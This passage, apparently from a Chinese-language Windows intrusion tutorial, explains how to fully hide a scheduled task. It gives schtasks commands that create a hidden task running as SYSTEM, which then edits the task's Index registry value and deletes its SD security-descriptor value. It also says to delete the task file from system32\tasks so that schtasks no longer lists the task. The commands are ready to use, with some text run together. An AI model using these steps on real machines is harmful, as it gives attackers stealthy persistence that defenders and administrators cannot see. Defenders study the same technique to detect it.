
    

    不过修改对应的index必须是system权限才可修改，所以我们需要用到计划任务将权限提升至system进行操作，这里我创建了一个hidden的计划任务用于修改demo的index值

*   
*   

```
schtasks /create /tn hidden /tr "cmd /c reg add \"hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\demo\" /v index /t reg_dword /d 0 /f" /sc onstart /ru systemschtasks /run /tn hidde
```

# 三、完全隐藏计划任务

     和非完全隐藏的的区别在于即使知道了任务名字用schtasks 也查询不到  
步骤如下:

*   删除C:\\windows\\system32\\tasks对应的文件
    
*   删除对应注册表的SD项
    

*   

```

```

这是demo计划任务默认项  

![](../Images/cee8eba7c9e1c663c3216fe8b488ee85.png)

以system权限删除SD项

*   
*   

```
schtasks /create /tn hidden /tr "cmd /c reg delete \"hklm\software\microsoft\windows nt\currentversion\schedule\taskcache\tree\demo\" /v sd /f " /sc onstart /ru system /fschtasks /run /tn hidden
```

![](../Images/1e68aef9b55f0dc04f8cc15611aebc89.png)

SD项已被成功删除

![](../Images/cee8eba7c9e1c663c3216fe8b488ee85.png)

此时用schtasks也查不到了
